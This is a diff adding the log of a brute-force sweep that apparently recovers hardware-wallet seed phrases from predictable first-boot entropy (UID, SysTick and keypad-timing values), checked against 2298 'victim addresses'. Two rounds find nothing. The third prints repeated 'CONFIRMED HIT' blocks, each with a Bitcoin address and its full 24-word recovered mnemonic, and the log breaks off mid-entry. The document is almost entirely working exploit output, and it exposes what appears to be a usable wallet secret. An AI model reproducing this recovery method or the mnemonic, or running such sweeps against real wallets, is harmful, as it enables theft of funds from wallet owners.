@@ -1,0 +1,3982 @@
+=== sweep started 2026-08-05 23:11:30 ===
+phase A: 72x72 UIDs, B ascending (B=18 already swept: 0 hits)
+[2026-08-05 23:11:30] START B=20 x[0..72] y[0..72]
+uid candidates: 8257
+targets: 2298 victim addresses (purpose 84 kind 0 coin 0)
+profile           = retail-first-boot
+rtc range         = 0..0 (raw RTC_TR)
+systick range     = 0..79999
+ssr range         = 0..0
+kpad-a range      = 2..2 (pre-terms scans)
+kpad-b range      = 20..20 step 1 (post-terms scans)
+total candidates  = 660.56M
+chunk             = up to 16.72M candidates (209 uid x 1 rtc)
+[2.53%] 16.72M/660.56M @ 45.08K/s  ETA 3.97h
+[5.06%] 33.44M/660.56M @ 44.53K/s  ETA 3.91h
+[7.59%] 50.16M/660.56M @ 44.25K/s  ETA 3.83h
+[10.12%] 66.88M/660.56M @ 44.25K/s  ETA 3.73h
+[12.66%] 83.60M/660.56M @ 44.18K/s  ETA 3.63h
+[15.19%] 100.32M/660.56M @ 43.95K/s  ETA 3.54h
+[17.72%] 117.04M/660.56M @ 44.05K/s  ETA 3.43h
+[20.25%] 133.76M/660.56M @ 44.14K/s  ETA 3.32h
+[22.78%] 150.48M/660.56M @ 44.19K/s  ETA 3.21h
+[25.31%] 167.20M/660.56M @ 44.19K/s  ETA 3.10h
+[27.84%] 183.92M/660.56M @ 44.20K/s  ETA 3.00h
+[30.37%] 200.64M/660.56M @ 44.22K/s  ETA 2.89h
+[32.91%] 217.36M/660.56M @ 44.23K/s  ETA 2.78h
+[35.44%] 234.08M/660.56M @ 44.27K/s  ETA 2.68h
+[37.97%] 250.80M/660.56M @ 44.29K/s  ETA 2.57h
+[40.50%] 267.52M/660.56M @ 44.32K/s  ETA 2.46h
+[43.03%] 284.24M/660.56M @ 44.33K/s  ETA 2.36h
+[45.56%] 300.96M/660.56M @ 44.32K/s  ETA 2.25h
+[48.09%] 317.68M/660.56M @ 44.34K/s  ETA 2.15h
+[50.62%] 334.40M/660.56M @ 44.35K/s  ETA 2.04h
+[53.15%] 351.12M/660.56M @ 44.35K/s  ETA 1.94h
+[55.69%] 367.84M/660.56M @ 44.36K/s  ETA 1.83h
+[58.22%] 384.56M/660.56M @ 44.38K/s  ETA 1.73h
+[60.75%] 401.28M/660.56M @ 44.38K/s  ETA 1.62h
+[63.28%] 418.00M/660.56M @ 44.39K/s  ETA 1.52h
+[65.81%] 434.72M/660.56M @ 44.40K/s  ETA 1.41h
+[68.34%] 451.44M/660.56M @ 44.40K/s  ETA 1.31h
+[70.87%] 468.16M/660.56M @ 44.40K/s  ETA 1.20h
+[73.40%] 484.88M/660.56M @ 44.41K/s  ETA 1.10h
+[75.94%] 501.60M/660.56M @ 44.41K/s  ETA 0.99h
+[78.47%] 518.32M/660.56M @ 44.42K/s  ETA 0.89h
+[81.00%] 535.04M/660.56M @ 44.43K/s  ETA 0.78h
+[83.53%] 551.76M/660.56M @ 44.43K/s  ETA 0.68h
+[86.06%] 568.48M/660.56M @ 44.44K/s  ETA 0.58h
+[88.59%] 585.20M/660.56M @ 44.45K/s  ETA 0.47h
+[91.12%] 601.92M/660.56M @ 44.46K/s  ETA 0.37h
+[93.65%] 618.64M/660.56M @ 44.47K/s  ETA 0.26h
+[96.19%] 635.36M/660.56M @ 44.48K/s  ETA 0.16h
+[98.72%] 652.08M/660.56M @ 44.48K/s  ETA 0.05h
+[100.00%] 660.56M/660.56M @ 44.48K/s  ETA 0.00h
+
+done: 660.56M candidates, 0 confirmed hit(s)
+[2026-08-06 03:19:53] END   B=20 x[0..72] y[0..72]  confirmed_total=0
+0
+[2026-08-06 03:19:53] START B=22 x[0..72] y[0..72]
+uid candidates: 8257
+targets: 2298 victim addresses (purpose 84 kind 0 coin 0)
+profile           = retail-first-boot
+rtc range         = 0..0 (raw RTC_TR)
+systick range     = 0..79999
+ssr range         = 0..0
+kpad-a range      = 2..2 (pre-terms scans)
+kpad-b range      = 22..22 step 1 (post-terms scans)
+total candidates  = 660.56M
+chunk             = up to 16.72M candidates (209 uid x 1 rtc)
+[2.53%] 16.72M/660.56M @ 44.69K/s  ETA 4.00h
+[5.06%] 33.44M/660.56M @ 44.58K/s  ETA 3.91h
+[7.59%] 50.16M/660.56M @ 44.56K/s  ETA 3.80h
+[10.12%] 66.88M/660.56M @ 44.58K/s  ETA 3.70h
+[12.66%] 83.60M/660.56M @ 44.59K/s  ETA 3.59h
+[15.19%] 100.32M/660.56M @ 44.64K/s  ETA 3.49h
+[17.72%] 117.04M/660.56M @ 44.62K/s  ETA 3.38h
+[20.25%] 133.76M/660.56M @ 44.60K/s  ETA 3.28h
+[22.78%] 150.48M/660.56M @ 44.61K/s  ETA 3.18h
+[25.31%] 167.20M/660.56M @ 44.61K/s  ETA 3.07h
+[27.84%] 183.92M/660.56M @ 44.63K/s  ETA 2.97h
+[30.37%] 200.64M/660.56M @ 44.65K/s  ETA 2.86h
+[32.91%] 217.36M/660.56M @ 44.66K/s  ETA 2.76h
+[35.44%] 234.08M/660.56M @ 44.67K/s  ETA 2.65h
+[37.97%] 250.80M/660.56M @ 44.64K/s  ETA 2.55h
+[40.50%] 267.52M/660.56M @ 44.63K/s  ETA 2.45h
+[43.03%] 284.24M/660.56M @ 44.65K/s  ETA 2.34h
+[45.56%] 300.96M/660.56M @ 44.66K/s  ETA 2.24h
+[48.09%] 317.68M/660.56M @ 44.68K/s  ETA 2.13h
+[50.62%] 334.40M/660.56M @ 44.69K/s  ETA 2.03h
+[53.15%] 351.12M/660.56M @ 44.71K/s  ETA 1.92h
+[55.69%] 367.84M/660.56M @ 44.71K/s  ETA 1.82h
+[58.22%] 384.56M/660.56M @ 44.70K/s  ETA 1.72h
+[60.75%] 401.28M/660.56M @ 44.70K/s  ETA 1.61h
+[63.28%] 418.00M/660.56M @ 44.70K/s  ETA 1.51h
+[65.81%] 434.72M/660.56M @ 44.71K/s  ETA 1.40h
+[68.34%] 451.44M/660.56M @ 44.72K/s  ETA 1.30h
+[70.87%] 468.16M/660.56M @ 44.72K/s  ETA 1.20h
+[73.40%] 484.88M/660.56M @ 44.73K/s  ETA 1.09h
+[75.94%] 501.60M/660.56M @ 44.73K/s  ETA 0.99h
+[78.47%] 518.32M/660.56M @ 44.73K/s  ETA 0.88h
+[81.00%] 535.04M/660.56M @ 44.74K/s  ETA 0.78h
+[83.53%] 551.76M/660.56M @ 44.74K/s  ETA 0.68h
+[86.06%] 568.48M/660.56M @ 44.73K/s  ETA 0.57h
+[88.59%] 585.20M/660.56M @ 44.71K/s  ETA 0.47h
+[91.12%] 601.92M/660.56M @ 44.71K/s  ETA 0.36h
+[93.65%] 618.64M/660.56M @ 44.71K/s  ETA 0.26h
+[96.19%] 635.36M/660.56M @ 44.71K/s  ETA 0.16h
+[98.72%] 652.08M/660.56M @ 44.70K/s  ETA 0.05h
+[100.00%] 660.56M/660.56M @ 44.70K/s  ETA 0.00h
+
+done: 660.56M candidates, 0 confirmed hit(s)
+[2026-08-06 07:26:10] END   B=22 x[0..72] y[0..72]  confirmed_total=0
+0
+[2026-08-06 07:26:10] START B=24 x[0..72] y[0..72]
+uid candidates: 8257
+targets: 2298 victim addresses (purpose 84 kind 0 coin 0)
+profile           = retail-first-boot
+rtc range         = 0..0 (raw RTC_TR)
+systick range     = 0..79999
+ssr range         = 0..0
+kpad-a range      = 2..2 (pre-terms scans)
+kpad-b range      = 24..24 step 1 (post-terms scans)
+total candidates  = 660.56M
+chunk             = up to 16.72M candidates (209 uid x 1 rtc)
+[2.53%] 16.72M/660.56M @ 44.33K/s  ETA 4.03h
+[5.06%] 33.44M/660.56M @ 44.17K/s  ETA 3.94h
+[7.59%] 50.16M/660.56M @ 44.18K/s  ETA 3.84h
+[10.12%] 66.88M/660.56M @ 44.27K/s  ETA 3.72h
+[12.66%] 83.60M/660.56M @ 44.27K/s  ETA 3.62h
+[15.19%] 100.32M/660.56M @ 44.20K/s  ETA 3.52h
+[17.72%] 117.04M/660.56M @ 44.22K/s  ETA 3.41h
+[20.25%] 133.76M/660.56M @ 44.25K/s  ETA 3.31h
+[22.78%] 150.48M/660.56M @ 44.22K/s  ETA 3.20h
+[25.31%] 167.20M/660.56M @ 44.22K/s  ETA 3.10h
+[27.84%] 183.92M/660.56M @ 44.25K/s  ETA 2.99h
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0000
+  systick  = 6576
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0001
+  systick  = 6577
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0002
+  systick  = 6578
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0003
+  systick  = 6579
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0004
+  systick  = 6580
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0005
+  systick  = 6581
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0006
+  systick  = 6582
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0007
+  systick  = 6583
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0008
+  systick  = 6584
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0009
+  systick  = 6585
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a000a
+  systick  = 6586
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a000b
+  systick  = 6587
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a000c
+  systick  = 6588
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a000d
+  systick  = 6589
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a000e
+  systick  = 6590
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a000f
+  systick  = 6591
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0010
+  systick  = 6560
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0011
+  systick  = 6561
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0012
+  systick  = 6562
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0013
+  systick  = 6563
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0014
+  systick  = 6564
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0015
+  systick  = 6565
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0016
+  systick  = 6566
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0017
+  systick  = 6567
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0018
+  systick  = 6568
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0019
+  systick  = 6569
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a001a
+  systick  = 6570
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a001b
+  systick  = 6571
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a001c
+  systick  = 6572
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a001d
+  systick  = 6573
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a001e
+  systick  = 6574
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a001f
+  systick  = 6575
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0020
+  systick  = 6544
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0021
+  systick  = 6545
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0022
+  systick  = 6546
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0023
+  systick  = 6547
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0024
+  systick  = 6548
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0025
+  systick  = 6549
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0026
+  systick  = 6550
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0027
+  systick  = 6551
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0028
+  systick  = 6552
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0029
+  systick  = 6553
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a002a
+  systick  = 6554
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a002b
+  systick  = 6555
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a002c
+  systick  = 6556
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a002d
+  systick  = 6557
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a002e
+  systick  = 6558
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a002f
+  systick  = 6559
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0030
+  systick  = 6528
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0031
+  systick  = 6529
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
